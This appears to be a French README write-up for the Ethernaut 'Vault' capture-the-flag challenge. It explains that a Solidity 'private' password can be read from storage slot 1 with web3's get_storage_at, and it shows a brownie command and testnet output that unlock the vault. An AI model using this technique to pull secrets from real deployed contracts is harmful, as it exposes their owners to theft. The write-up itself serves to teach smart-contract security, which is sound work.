# Vault

## Objectif
L'objectif de ce challenge est de déverrouiller le vault

## Contract

Le contrat est très simple, pour pouvoir le déverrouiller, il faut appeler la méthode [`unlock`](contracts/vault.sol#13) en lui donnant le bon mot de passe.

Le bon mot de passe est un [membre `private`](contracts/vault.sol#6) du contrat

Le mot clé `private` signifie seulement que la variable est seulement visible du contrat qui la définit.
Mais il est possible de lire le contenu de la variable.

Les membres des contract sont stockés dans des slots dont le premier index est 0

Dans le cas du contrat `Vault`, nous avons le membre `locked` qui est socké dans le slot d'index 0 et le membre `password` dans le slot d'index 1

En lisant la valeur stocké dans le slot d'index 1, nous récupérons le mot de passe:
```
read_password = web3.eth.get_storage_at(vault.address, 1)
```


## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/unlock.py main "0xDe765054224062E20ea0bf282696984d685B9704" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

VaultProject is the active project.

Running 'scripts/unlock.py::main'...
Locked: True
Transaction sent: 0xcbd474af778d212430e17bb9d68a1e93995d1619cbb59155d62be70ce096a073
  Gas price: 1.000000014 gwei   Gas limit: 31896   Nonce: 237
  Transaction confirmed   Block: 10464941   Gas used: 24197 (75.86%)

Locked: False
```
